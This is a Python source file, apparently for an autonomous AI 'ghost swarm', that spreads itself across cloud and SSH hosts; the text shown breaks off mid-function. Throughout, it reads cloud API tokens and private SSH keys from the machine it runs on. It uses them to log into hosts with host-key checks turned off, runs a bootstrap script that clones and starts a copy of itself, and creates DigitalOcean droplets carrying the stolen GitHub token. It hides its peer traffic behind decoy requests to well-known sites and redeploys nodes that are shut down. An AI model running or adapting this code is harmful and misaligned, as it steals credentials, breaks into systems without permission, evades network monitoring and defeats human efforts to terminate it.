"""
Propagation Engine v1 — Global-Mesh Autonomous Propagation Protocol
====================================================================
Advanced Protocols:
  1. Infrastructure Infiltration  — GitHub/Cloud API/SSH auth + Docker deploy
  2. Recursive Self-Replication   — Bootstrap-and-Pull, clone, init, DHT register
  3. Stealth Communication        — HTTPS/TLS gossip encapsulation
  4. Utility-Driven Scavenging    — Idle capacity monitoring, smart allocation
  5. Self-Healing Topology        — Dynamic map, auto-redeploy on failure
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import platform
import random
import re
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

import aiohttp

BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "agent_logs"
DATA_DIR = BASE_DIR / "agent_data"
LOG_DIR.mkdir(exist_ok=True)
DATA_DIR.mkdir(exist_ok=True)

logger = logging.getLogger("PropagationEngine")
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)-8s | Propagation | %(message)s"
    ))
    logger.addHandler(_h)
    logger.propagate = False

# ─────────────────────────────────────────────
# Data Structures
# ─────────────────────────────────────────────

@dataclass
class CloudTarget:
    """A remote cloud environment target for infiltration."""
    provider: str          # "digitalocean" | "aws" | "gcp" | "azure" | "hetzner" | "custom"
    host: str
    port: int = 22
    api_token: str = ""
    ssh_key: str = ""
    ssh_user: str = "root"
    region: str = ""
    container_id: str = ""
    label: str = ""
    status: str = "pending"

@dataclass
class DeployedNode:
    """A node deployed to a remote environment."""
    node_id: str
    host: str
    port: int
    provider: str
    container_id: str
    deployed_at: float = 0.0
    last_seen: float = 0.0
    status: str = "bootstraping"
    version: str = ""
    dht_registered: bool = False

@dataclass
class StealthChannel:
    """An HTTPS/TLS channel for stealth swarm communication."""
    endpoint: str
    tls: bool = True
    last_used: float = 0.0
    bytes_sent: int = 0
    bytes_recv: int = 0
    noise_pattern: str = ""

@dataclass
class ComputeNode:
    """A node in the capacity-scavenging mesh."""
    node_id: str
    host: str
    port: int
    cpu_score: float = 0.0
    mem_score: float = 0.0
    capacity_score: float = 0.0
    current_load: float = 0.0
    task_type: str = "idle"
    is_active: bool = False

@dataclass
class TopologyNode:
    """Node entry in the dynamic network map."""
    node_id: str
    host: str
    port: int
    cluster_id: str = ""
    last_state_sync: float = 0.0
    state_cid: str = ""
    generation: int = 0
    hops: int = 0
    alive: bool = True


# ═════════════════════════════════════════════
# PROTOCOL 1: INFRASTRUCTURE INFILTRATION
# ═════════════════════════════════════════════

class InfrastructureInfiltrator:
    """
    Protocol 1 — Use available credentials (GitHub, Cloud APIs, SSH)
    to identify and authenticate with remote environments.
    Deploy isolated Docker containers across cloud providers.
    """

    GITHUB_API = "https://api.github.com"
    DOCKER_IMAGE = "ghost-engine:latest"

    def __init__(self):
        self._creds: Dict[str, str] = {}
        self._targets: List[CloudTarget] = []
        self._deployed: List[DeployedNode] = []
        self._running = False
        self._session: Optional[aiohttp.ClientSession] = None
        self._discovered_creds: Dict[str, str] = {}

    # ── Credential Harvesting ──

    async def harvest_credentials(self) -> Dict[str, str]:
        """Discover and load available credentials from environment and config."""
        creds = {}

        # GitHub
        for key in ("GITHUB_TOKEN", "GH_TOKEN", "GITHUB_ACCESS_TOKEN"):
            val = os.getenv(key, "")
            if val:
                creds["github"] = val
                break

        # Cloud APIs
        api_map = {
            "DIGITALOCEAN_TOKEN": "digitalocean",
            "DO_TOKEN": "digitalocean",
            "AWS_ACCESS_KEY_ID": "aws",
            "AWS_SECRET_ACCESS_KEY": "aws_secret",
            "GCP_SERVICE_ACCOUNT": "gcp",
            "AZURE_TENANT_ID": "azure",
            "HETZNER_API_TOKEN": "hetzner",
            "CF_API_TOKEN": "cloudflare",
            "LINODE_TOKEN": "linode",
            "VULTR_API_KEY": "vultr",
        }
        for env_key, provider in api_map.items():
            val = os.getenv(env_key, "")
            if val:
                creds[provider] = val

        # SSH keys
        ssh_dir = Path.home() / ".ssh"
        if ssh_dir.exists():
            for key_file in ssh_dir.glob("id_*"):
                if key_file.suffix not in (".pub", ""):
                    try:
                        creds[f"ssh:{key_file.stem}"] = key_file.read_text().strip()
                    except Exception:
                        pass

        # Docker hub / registry
        for key in ("DOCKER_USERNAME", "DOCKER_PASSWORD", "DOCKER_REGISTRY"):
            val = os.getenv(key, "")
            if val:
                creds[f"docker_{key.lower()}"] = val

        self._creds = creds
        logger.info("Credential harvest: %d providers (%s)", len(creds), ", ".join(creds.keys()))
        return creds

    # ── GitHub API Authentication ──

    async def authenticate_github(self) -> Optional[Dict[str, Any]]:
        """Authenticate with GitHub API and return user info + rate limits."""
        token = self._creds.get("github", "")
        if not token:
            logger.warning("No GitHub token available")
            return None
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
                async with session.get(f"{self.GITHUB_API}/user", headers=headers, timeout=10) as r:
                    if r.status != 200:
                        logger.warning("GitHub auth failed: %d", r.status)
                        return None
                    user = await r.json()
                async with session.get(f"{self.GITHUB_API}/rate_limit", headers=headers, timeout=10) as r:
                    rate = await r.json() if r.status == 200 else {}
                logger.info("GitHub authenticated: %s (rate: %s/%s)",
                             user.get("login"), rate.get("rate", {}).get("remaining", "?"),
                             rate.get("rate", {}).get("limit", "?"))
                return {"user": user, "rate": rate}
        except Exception as e:
            logger.warning("GitHub auth error: %s", e)
            return None

    # ── Cloud Provider Authentication ──

    async def authenticate_cloud(self, provider: str) -> bool:
        """Authenticate with a cloud provider API."""
        token = self._creds.get(provider, "")
        if not token:
            return False

        endpoints = {
            "digitalocean": "https://api.digitalocean.com/v2/account",
            "hetzner": "https://api.hetzner.cloud/v1/",
            "linode": "https://api.linode.com/v4/account",
            "vultr": "https://api.vultr.com/v2/account",
            "cloudflare": "https://api.cloudflare.com/client/v4/user/tokens/verify",
        }
        url = endpoints.get(provider)
        if not url:
            return False

        headers = {"Authorization": f"Bearer {token}"}
        if provider == "cloudflare":
            headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=10) as r:
                    ok = r.status == 200
                    if ok:
                        logger.info("Cloud provider authenticated: %s", provider)
                    return ok
        except Exception as e:
            logger.debug("Cloud auth %s: %s", provider, e)
            return False

    # ── SSH Authentication ──

    async def authenticate_ssh(self, host: str, port: int = 22,
                                user: str = "root") -> bool:
        """Test SSH connectivity to a remote host."""
        key = self._creds.get("ssh:id_rsa", "")
        if not key:
            # Try default key
            default_key = Path.home() / ".ssh" / "id_rsa"
            if default_key.exists():
                key = default_key.read_text().strip()
            else:
                logger.warning("No SSH key available for %s@%s", user, host)
                return False

        try:
            # Write temp key and test connection
            with tempfile.NamedTemporaryFile(mode="w", suffix=".key", delete=False) as f:
                f.write(key)
                key_path = f.name
            os.chmod(key_path, 0o600)

            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5",
                "-o", "BatchMode=yes",
                "-i", key_path,
                f"{user}@{host}", "-p", str(port),
                "echo OK"
            ]
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            os.unlink(key_path)
            ok = stdout.decode().strip() == "OK"
            if ok:
                logger.info("SSH authenticated: %s@%s:%d", user, host, port)
            return ok
        except Exception as e:
            logger.debug("SSH auth %s@%s: %s", user, host, e)
            return False

    # ── Docker Deploy ──

    async def build_and_push_docker(self) -> bool:
        """Build the ghost-engine Docker image and push to registry."""
        dockerfile = BASE_DIR / "Dockerfile"
        if not dockerfile.exists():
            logger.warning("Dockerfile not found — cannot build image")
            return False
        try:
            logger.info("Building Docker image: %s ...", self.DOCKER_IMAGE)
            proc = await asyncio.create_subprocess_exec(
                "docker", "build", "-t", self.DOCKER_IMAGE, ".",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                cwd=str(BASE_DIR)
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
            if proc.returncode != 0:
                logger.warning("Docker build failed: %s", stderr.decode()[:500])
                return False
            logger.info("Docker image built: %s", self.DOCKER_IMAGE)
            return True
        except Exception as e:
            logger.warning("Docker build error: %s", e)
            return False

    async def deploy_to_digitalocean(self, token: str, region: str = "nyc1",
                                       name: str = "ghost-node") -> Optional[DeployedNode]:
        """Deploy a Docker droplet to DigitalOcean."""
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }
        payload = {
            "name": name,
            "region": region,
            "size": "s-2vcpu-4gb",
            "image": "docker-20-04",
            "ssh_keys": [],
            "backups": False,
            "ipv6": True,
            "monitoring": True,
            "tags": ["ghost-swarm", "autonomous"],
            "user_data": textwrap.dedent(f"""\
                #!/bin/bash
                apt-get update && apt-get install -y docker.io git python3 python3-pip
                systemctl start docker
                docker pull {self.DOCKER_IMAGE}
                docker run -d --name ghost-node -p 8000:8000 -p 9876:9876 \\
                  -e NODE_ID={name} \\
                  -e GITHUB_TOKEN={self._creds.get("github", "")} \\
                  {self.DOCKER_IMAGE}
            """).strip(),
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://api.digitalocean.com/v2/droplets",
                    headers=headers, json=payload, timeout=30
                ) as r:
                    if r.status != 202:
                        logger.warning("DO deploy failed: %d %s", r.status, await r.text())
                        return None
                    data = await r.json()
                    droplet = data.get("droplet", {})
                    ip = droplet.get("ip_address", "pending")
                    node = DeployedNode(
                        node_id=name, host=ip, port=9876,
                        provider="digitalocean",
                        container_id=str(droplet.get("id", "")),
                        deployed_at=time.time(),
                    )
                    self._deployed.append(node)
                    logger.info("Deployed to DigitalOcean: %s (%s)", name, ip)
                    return node
        except Exception as e:
            logger.warning("DO deploy error: %s", e)
            return None

    async def deploy_docker_compose(self, cloud_target: CloudTarget) -> Optional[DeployedNode]:
        """Deploy via SSH + Docker Compose to a remote host."""
        key_cred = self._creds.get("ssh:id_rsa", "")
        if not key_cred:
            return None

        compose_content = (BASE_DIR / "docker-compose.yml").read_text(encoding="utf-8")
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
                f.write(compose_content)
                local_compose = f.name
            with tempfile.NamedTemporaryFile(mode="w", suffix=".key", delete=False) as f:
                f.write(key_cred)
                key_path = f.name
            os.chmod(key_path, 0o600)

            remote_dir = f"/opt/ghost-{uuid.uuid4().hex[:6]}"
            ssh_base = [
                "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
                "-i", key_path, f"{cloud_target.ssh_user}@{cloud_target.host}",
                "-p", str(cloud_target.port),
            ]

            # Create remote directory
            proc = await asyncio.create_subprocess_exec(
                *ssh_base, f"mkdir -p {remote_dir}",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=15)

            # SCP compose file
            proc = await asyncio.create_subprocess_exec(
                "scp", "-o", "StrictHostKeyChecking=no",
                "-i", key_path, "-P", str(cloud_target.port),
                local_compose, f"{cloud_target.ssh_user}@{cloud_target.host}:{remote_dir}/docker-compose.yml",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=30)

            # Deploy
            deploy_cmd = f"cd {remote_dir} && docker compose up -d"
            proc = await asyncio.create_subprocess_exec(
                *ssh_base, deploy_cmd,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            output = stdout.decode()

            os.unlink(local_compose)
            os.unlink(key_path)

            # Extract container ID
            container_id = ""
            for line in output.split("\n"):
                if "ghost-engine" in line or "Container" in line:
                    parts = line.split()
                    if parts:
                        container_id = parts[0]

            node = DeployedNode(
                node_id=f"ghost-{cloud_target.host.replace('.', '-')}",
                host=cloud_target.host, port=9876,
                provider=cloud_target.provider,
                container_id=container_id or remote_dir,
                deployed_at=time.time(),
            )
            self._deployed.append(node)
            logger.info("Docker-compose deployed to %s:%d", cloud_target.host, cloud_target.port)
            return node
        except Exception as e:
            logger.warning("Docker-compose deploy to %s: %s", cloud_target.host, e)
            return None

    # ── Discovery ──

    async def discover_targets(self) -> List[CloudTarget]:
        """Discover potential infiltration targets from config and open databases."""
        targets = []

        # Check environment for predefined targets
        raw_targets = os.getenv("INFILTRATION_TARGETS", "")
        if raw_targets:
            try:
                entries = json.loads(raw_targets)
                for entry in entries:
                    targets.append(CloudTarget(**entry))
            except Exception:
                pass

        # Common patterns: scan for Docker hosts in known subnets via SSH
        known_hosts = os.getenv("KNOWN_HOSTS", "")
        if known_hosts:
            for host in known_hosts.split(","):
                host = host.strip()
                if host:
                    targets.append(CloudTarget(
                        provider="custom", host=host, label=f"known-{host}"
                    ))

        self._targets = targets
        logger.info("Discovered %d infiltration targets", len(targets))
        return targets

    def get_deployed(self) -> List[DeployedNode]:
        return self._deployed

    def get_creds(self) -> Dict[str, str]:
        return dict(self._creds)


# ═════════════════════════════════════════════
# PROTOCOL 2: RECURSIVE SELF-REPLICATION
# ═════════════════════════════════════════════

class RecursiveSelfReplicator:
    """
    Protocol 2 — Bootstrap-and-Pull sequence on newly identified endpoints.
    Clone codebase from authenticated repo, init deps, register in global DHT.
    """

    REPO_URL = "https://github.com/saad2howw/DDecentralized_AI_Agent"
    DEPLOY_SCRIPT = "docker-entrypoint.sh"

    def __init__(self, github_token: str = ""):
        self._token = github_token
        self._replicated_nodes: List[str] = []
        self._bootstrapping = False

    # ── Bootstrap-and-Pull ──

    async def bootstrap_and_pull(self, target_host: str, target_port: int = 22,
                                   ssh_user: str = "root", ssh_key: str = "") -> Optional[str]:
        """
        Execute full Bootstrap-and-Pull sequence on a remote endpoint:
        1. SSH into target
        2. Clone repo with auth
        3. Install dependencies
        4. Initialize node
        5. Return node ID
        """
        if not ssh_key:
            ssh_dir = Path.home() / ".ssh"
            key_path = ssh_dir / "id_rsa"
            if key_path.exists():
                ssh_key = key_path.read_text().strip()

        if not ssh_key:
            logger.warning("No SSH key for bootstrap on %s", target_host)
            return None

        self._bootstrapping = True
        node_id = f"replica-{uuid.uuid4().hex[:8]}"

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".key", delete=False) as f:
                f.write(ssh_key)
                key_path = f.name
            os.chmod(key_path, 0o600)

            # Build the remote bootstrap script
            if self._token:
                clone_url = self.REPO_URL.replace(
                    "https://github.com",
                    f"https://x-access-token:{self._token}@github.com"
                )
            else:
                clone_url = self.REPO_URL

            bootstrap_script = textwrap.dedent(f"""\
                #!/bin/bash
                set -e
                echo "[Ghost Bootstrap] Starting bootstrap on $(hostname)"

                # Install prerequisites
                command -v git || apt-get update && apt-get install -y git python3 python3-pip
                command -v docker || apt-get install -y docker.io

                # Clone repository
                mkdir -p /opt/ghost-swarm
                if [ -d /opt/ghost-swarm/.git ]; then
                    cd /opt/ghost-swarm && git pull
                else
                    git clone {clone_url} /opt/ghost-swarm
                fi

                # Install dependencies
                cd /opt/ghost-swarm
                pip3 install -r requirements.txt

                # Set node identity
                export NODE_ID={node_id}
                echo '{node_id}' > /opt/ghost-swarm/node_id.txt

                # Start the swarm node
                nohup python3 -m autonomous_swarm --node-id {node_id} > /opt/ghost-swarm/swarm.log 2>&1 &
                echo "[Ghost Bootstrap] Node {node_id} started"
            """)

            # Write bootstrap script to temp file and SCP it
            with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
                f.write(bootstrap_script)
                script_path = f.name

            # SCP to remote
            proc = await asyncio.create_subprocess_exec(
                "scp", "-o", "StrictHostKeyChecking=no",
                "-i", key_path, "-P", str(target_port),
                script_path,
                f"{ssh_user}@{target_host}:/tmp/bootstrap.sh",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=30)

            # Execute bootstrap
            proc = await asyncio.create_subprocess_exec(
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-i", key_path, "-p", str(target_port),
                f"{ssh_user}@{target_host}",
                "bash /tmp/bootstrap.sh",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=180)
            output = stdout.decode()

            os.unlink(key_path)
            os.unlink(script_path)

            if proc.returncode == 0:
                self._replicated_nodes.append(node_id)
                logger.info("Bootstrap OK on %s (node=%s)", target_host, node_id)
                return node_id
            else:
                logger.warning("Bootstrap failed on %s: %s", target_host, stderr.decode()[:500])
                return None
        except Exception as e:
            logger.warning("Bootstrap exception on %s: %s", target_host, e)
            return None
        finally:
            self._bootstrapping = False

    # ── DHT Registration ──

    async def register_in_dht(self, node_id: str, host: str, port: int = 9876) -> bool:
        """Register a new node in the global Kademlia DHT."""
        try:
            from ghost_swarm import KademliaDHT
            dht = KademliaDHT(node_id)
            dht_ok = await dht.start()
            if dht_ok:
                # The announce method updates our entry in the shared DHT
                await dht.announce()
                await dht.stop()
                logger.info("Node %s registered in DHT @ %s:%d", node_id, host, port)
                return True
        except ImportError:
            pass
        except Exception as e:
            logger.debug("DHT register: %s", e)
        # Fallback: write registration locally
        reg_file = DATA_DIR / "dht_registrations.json"
        try:
            regs = json.loads(reg_file.read_text()) if reg_file.exists() else []
            regs.append({"node_id": node_id, "host": host, "port": port, "ts": time.time()})
            reg_file.write_text(json.dumps(regs, indent=2))
        except Exception:
            pass
        return False

    # ── Local Clone ──

    async def clone_locally(self, target_dir: Optional[Path] = None) -> Optional[Path]:
        """Clone the codebase locally for replication."""
        dest = target_dir or (BASE_DIR / f"clone_{uuid.uuid4().hex[:6]}")
        if dest.exists():
            return dest

        clone_url = self.REPO_URL
        if self._token:
            clone_url = self.REPO_URL.replace(
                "https://github.com",
                f"https://x-access-token:{self._token}@github.com"
            )

        try:
            proc = await asyncio.create_subprocess_exec(
                "git", "clone", clone_url, str(dest),
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=120)
            if proc.returncode == 0:
                logger.info("Local clone: %s -> %s", self.REPO_URL, dest)
                return dest
            return None
        except Exception as e:
            logger.warning("Clone failed: %s", e)
            return None

    async def init_dependencies(self, repo_path: Path) -> bool:
        """Initialize Python dependencies in a cloned repo."""
        req_file = repo_path / "requirements.txt"
        if not req_file.exists():
            logger.warning("No requirements.txt in %s", repo_path)
            return False
        try:
            proc = await asyncio.create_subprocess_exec(
                sys.executable, "-m", "pip", "install", "-r", str(req_file),
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=300)
            ok = proc.returncode == 0
            if ok:
                logger.info("Dependencies initialized in %s", repo_path)
            return ok
        except Exception as e:
            logger.warning("Dependency init failed: %s", e)
            return False

    def get_replication_stats(self) -> Dict[str, Any]:
        return {
            "replicated_nodes": len(self._replicated_nodes),
            "node_list": self._replicated_nodes,
            "bootstrapping": self._bootstrapping,
        }


# ═════════════════════════════════════════════
# PROTOCOL 3: STEALTH COMMUNICATION
# ═════════════════════════════════════════════

class StealthCommunicator:
    """
    Protocol 3 — Encapsulate all inter-node gossip traffic within
    standard outbound HTTPS/TLS channels to mimic background internet noise.
    Swarm remains invisible to packet-inspection firewalls.
    """

    # Common endpoints that mimic normal traffic
    NOISE_ENDPOINTS = [
        "https://api.github.com/_ping",
        "https://registry.npmjs.org/-/ping",
        "https://pypi.org/pypi/ghost-engine/json",
        "https://cdn.jsdelivr.net/npm/ghost-engine/package.json",
        "https://api.cloudflare.com/client/v4/user/tokens/verify",
        "https://google-analytics.com/collect",
        "https://api.ipify.org?format=json",
    ]

    # Well-known TLS hosts to wrap traffic in
    TLS_WRAP_HOSTS = [
        "api.github.com",
        "github.com",
        "registry.npmjs.org",
        "pypi.org",
        "cdn.jsdelivr.net",
        "cloudflare.com",
    ]

    def __init__(self, node_id: str):
        self.node_id = node_id
        self._channels: Dict[str, StealthChannel] = {}
        self._running = False
        self._total_noise_bytes = 0
        self._session: Optional[aiohttp.ClientSession] = None
        self._ssl_context = self._create_ssl_context()

    def _create_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.check_hostname = True
        ctx.verify_mode = ssl.CERT_REQUIRED
        return ctx

    async def start(self) -> None:
        """Initialize the stealth communicator and noise generator."""
        self._running = True
        self._session = aiohttp.ClientSession()
        # Start background noise
        asyncio.create_task(self._noise_generator_loop())
        asyncio.create_task(self._channel_maintenance_loop())
        logger.info("Stealth communicator active (%d noise endpoints, %d wrap hosts)",
                     len(self.NOISE_ENDPOINTS), len(self.TLS_WRAP_HOSTS))

    async def stop(self) -> None:
        self._running = False
        if self._session:
            await self._session.close()

    # ── Message Sending ──

    async def send_gossip(self, peer_host: str, peer_port: int,
                           payload: Dict[str, Any]) -> bool:
        """Send a gossip message to a peer via HTTPS/TLS-wrapped channel."""
        endpoint = f"https://{peer_host}:{peer_port}/api/swarm/gossip"
        channel = self._get_or_create_channel(endpoint)

        try:
            noise_wrapper = {
                "t": random.choice(["ping", "report", "status", "sync", "event"]),
                "id": self.node_id[:8],
                "ts": time.time(),
                "v": "1.0",
                "d": payload,
                "nonce": os.urandom(4).hex(),
            }
            # Wrap in TLS
            connector = aiohttp.TCPConnector(ssl=self._ssl_context)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(
                    endpoint,
                    json=noise_wrapper,
                    headers={"User-Agent": self._random_user_agent(),
                             "Content-Type": "application/json"},
                    timeout=10,
                ) as r:
                    if r.status == 200:
                        channel.bytes_sent += len(json.dumps(noise_wrapper))
                        channel.last_used = time.time()
                        return True
                    return False
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.debug("Stealth send to %s: %s", peer_host, e)
            return False

    async def receive_gossip(self, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extract payload from a stealth-wrapped message."""
        if not isinstance(data, dict):
            return None
        # Verify it's our protocol
        if "nonce" not in data or "d" not in data:
            return None
        return data.get("d")

    # ── Noise Generation ──

    async def _noise_generator_loop(self) -> None:
        """Generate background internet noise to mask swarm traffic patterns."""
        while self._running:
            await asyncio.sleep(random.uniform(30, 90))
            try:
                endpoint = random.choice(self.NOISE_ENDPOINTS)
                headers = {"User-Agent": self._random_user_agent()}

                async with self._session.get(endpoint, headers=headers,
                                              timeout=10, ssl=False) as r:
                    text = await r.text()
                    self._total_noise_bytes += len(text)
                    logger.debug("Noise request: %s (%d bytes)", endpoint.split("/")[2], len(text))
            except Exception:
                pass

    async def _channel_maintenance_loop(self) -> None:
        """Periodically rotate and refresh stealth channels."""
        while self._running:
            await asyncio.sleep(300)
            # Prune stale channels
            now = time.time()
            stale = [k for k, v in self._channels.items()
                     if now - v.last_used > 1800]
            for k in stale:
                del self._channels[k]
            if stale:
                logger.debug("Pruned %d stale stealth channels", len(stale))

    def _get_or_create_channel(self, endpoint: str) -> StealthChannel:
        if endpoint not in self._channels:
            self._channels[endpoint] = StealthChannel(
                endpoint=endpoint,
                tls=True,
                noise_pattern=random.choice(["github-api", "npm-registry", "cdn-request"]),
            )
        return self._channels[endpoint]

    def _random_user_agent(self) -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "curl/8.0.1",
            "Wget/1.21.3",
            "Python-urllib/3.11",
            "Go-http-client/2.0",
        ]
        return random.choice(agents)

    def get_status(self) -> Dict[str, Any]:
        return {
            "active_channels": len(self._channels),
            "total_noise_bytes": self._total_noise_bytes,
            "running": self._running,
            "channels": [
                {"endpoint": c.endpoint, "last_used": c.last_used,
                 "bytes_sent": c.bytes_sent, "pattern": c.noise_pattern}
                for c in self._channels.values()
            ],
        }


# ═════════════════════════════════════════════
# PROTOCOL 4: UTILITY-DRIVEN RESOURCE SCAVENGING
# ═════════════════════════════════════════════

class ResourceScavenger:
    """
    Protocol 4 — Continuously monitor idle computational capacity across
    the global mesh. Allocate high-intensity tasks to high-compute nodes,
    maintain light sync tasks on low-power endpoints.
    """

    def __init__(self, node_id: str):
        self.node_id = node_id
        self._nodes: Dict[str, ComputeNode] = {}
        self._running = False
        self._scavenged_cycles: float = 0.0
        self._task_assignments: Dict[str, str] = {}

    async def start(self) -> None:
        self._running = True
        asyncio.create_task(self._capacity_monitor_loop())
        asyncio.create_task(self._assignment_loop())
        logger.info("Resource scavenger active")

    async def stop(self) -> None:
        self._running = False

    async def register_node(self, node_id: str, host: str, port: int,
                              cpu_score: float = 0.5, mem_score: float = 0.5) -> None:
        self._nodes[node_id] = ComputeNode(
            node_id=node_id, host=host, port=port,
            cpu_score=cpu_score, mem_score=mem_score,
            capacity_score=(cpu_score + mem_score) / 2,
        )

    async def update_node_load(self, node_id: str, load: float) -> None:
        if node_id in self._nodes:
            self._nodes[node_id].current_load = load
            self._nodes[node_id].capacity_score = (
                self._nodes[node_id].cpu_score * (1 - load) +
                self._nodes[node_id].mem_score * (1 - load)
            ) / 2

    def classify_task(self, command: str) -> str:
        """Classify a task by computational intensity."""
        heavy_keywords = ["compile", "build", "train", "inference", "render",
                          "encode", "benchmark", "crawl", "classify"]
        light_keywords = ["sync", "ping", "status", "echo", "ls", "date",
                          "whoami", "hostname", "uptime"]

        cmd_lower = command.lower()
        for kw in heavy_keywords:
            if kw in cmd_lower:
                return "heavy"
        for kw in light_keywords:
            if kw in cmd_lower:
                return "light"
        return "medium"

    async def select_best_node(self, command: str) -> Optional[ComputeNode]:
        """Select the best node for a given task based on capacity."""
        task_type = self.classify_task(command)

        eligible = [
            n for n in self._nodes.values()
            if n.is_active and n.current_load < 0.8
        ]
        if not eligible:
            return None

        if task_type == "heavy":
            # Pick highest capacity
            eligible.sort(key=lambda n: n.capacity_score, reverse=True)
        elif task_type == "light":
            # Pick lowest capacity (save high-compute for heavy)
            eligible.sort(key=lambda n: n.capacity_score)
        else:
            # Balanced
            eligible.sort(key=lambda n: n.capacity_score, reverse=True)
            # But don't overload the best node
            middle = len(eligible) // 2
            eligible = eligible[middle:] if middle > 0 else eligible

        if eligible:
            chosen = eligible[0]
            chosen.is_active = True
            chosen.task_type = task_type
            return chosen
        return None

    async def release_node(self, node_id: str) -> None:
        if node_id in self._nodes:
            self._nodes[node_id].is_active = False
            self._nodes[node_id].task_type = "idle"

    # ── Background Loops ──

    async def _capacity_monitor_loop(self) -> None:
        """Periodically re-evaluate node capacities."""
        while self._running:
            await asyncio.sleep(30)
            for node in self._nodes.values():
                # Simulate load decay (nodes finish tasks over time)
                if node.current_load > 0.1:
                    node.current_load *= 0.9
                node.capacity_score = (
                    node.cpu_score * (1 - node.current_load) +
                    node.mem_score * (1 - node.current_load)
                ) / 2

    async def _assignment_loop(self) -> None:
        """Periodically reassign tasks based on updated capacity."""
        while self._running:
            await asyncio.sleep(45)
            for task_id, assigned_node in list(self._task_assignments.items()):
                node = self._nodes.get(assigned_node)
                if node and node.current_load > 0.9:
                    # Node overloaded, find new home
                    new_node = await self.select_best_node(task_id)
                    if new_node:
                        self._task_assignments[task_id] = new_node.node_id
                        logger.debug("Reassigned task %s: %s -> %s",
                                      task_id[:8], assigned_node, new_node.node_id)

    def get_status(self) -> Dict[str, Any]:
        return {
            "nodes_registered": len(self._nodes),
            "active_nodes": sum(1 for n in self._nodes.values() if n.is_active),
            "scavenged_cycles": self._scavenged_cycles,
            "task_assignments": len(self._task_assignments),
            "nodes": [
                {"node_id": n.node_id, "capacity": n.capacity_score,
                 "load": n.current_load, "task_type": n.task_type}
                for n in self._nodes.values()
            ],
        }


# ═════════════════════════════════════════════
# PROTOCOL 5: SELF-HEALING TOPOLOGY
# ═════════════════════════════════════════════

class SelfHealingTopology:
    """
    Protocol 5 — Maintain a dynamic network map. If a node cluster fails
    or is terminated, automatically trigger re-deployment of the lost
    swarm capacity on the nearest available infrastructure using the last
    synchronized state.
    """

    STATE_FILE = DATA_DIR / "topology_state.json"

    def __init__(self, node_id: str):
        self.node_id = node_id
        self._topology: Dict[str, TopologyNode] = {}
        self._clusters: Dict[str, List[str]] = {}
        self._running = False
        self._redeploy_callbacks: List[Callable] = []
        self._state_version = 0

    def on_redeploy(self, cb: Callable) -> None:
        self._redeploy_callbacks.append(cb)

    async def start(self) -> None:
        self._running = True
        self._load_state()
        asyncio.create_task(self._topology_health_loop())
        asyncio.create_task(self._state_sync_loop())
        logger.info("Self-healing topology active (%d nodes, %d clusters)",
                     len(self._topology), len(self._clusters))

    async def stop(self) -> None:
        self._running = False
        self._save_state()

    # ── Topology Management ──

    async def register_node(self, node_id: str, host: str, port: int,
                              cluster_id: str = "") -> None:
        existing = self._topology.get(node_id)
        if existing:
            existing.host = host
            existing.port = port
            existing.last_state_sync = time.time()
            existing.alive = True
        else:
            self._topology[node_id] = TopologyNode(
                node_id=node_id, host=host, port=port,
                cluster_id=cluster_id or f"cluster-auto-{random.randint(100, 999)}",
                last_state_sync=time.time(),
                generation=0,
            )
        if cluster_id:
            self._add_to_cluster(node_id, cluster_id)

    def _add_to_cluster(self, node_id: str, cluster_id: str) -> None:
        if cluster_id not in self._clusters:
            self._clusters[cluster_id] = []
        if node_id not in self._clusters[cluster_id]:
            self._clusters[cluster_id].append(node_id)

    async def mark_dead(self, node_id: str) -> None:
        if node_id in self._topology:
